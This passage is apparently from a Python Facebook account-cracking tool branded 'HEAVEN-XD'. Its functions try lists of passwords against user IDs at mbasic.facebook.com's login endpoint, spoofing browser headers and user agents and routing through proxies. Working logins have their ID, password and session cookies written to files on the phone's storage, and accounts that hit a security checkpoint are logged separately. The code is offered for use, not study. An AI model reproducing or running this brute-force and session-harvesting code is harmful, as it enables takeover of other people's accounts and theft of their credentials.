			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} + {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'+'+pw+'\n')
				akun.append(idf+'+'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} + {pw} {P}')
				open('/sdcard/hakku.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}[HEAVEN-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'host': 'mbasic.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '1.4375','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"RMX1825"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"10.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':ua,'viewport-width': '980',
})
			p = ses.get('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'host': 'mbasic.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '1.4375','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"RMX1825"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"10.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':ua,'viewport-width': '980',
}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} + {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'+'+pw+'\n')
				akun.append(idf+'+'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} + {pw} {P}')
				open('/sdcard/HEAVEN.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok.append(wrt)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()

#TYSM FOR USING THIS COMMAND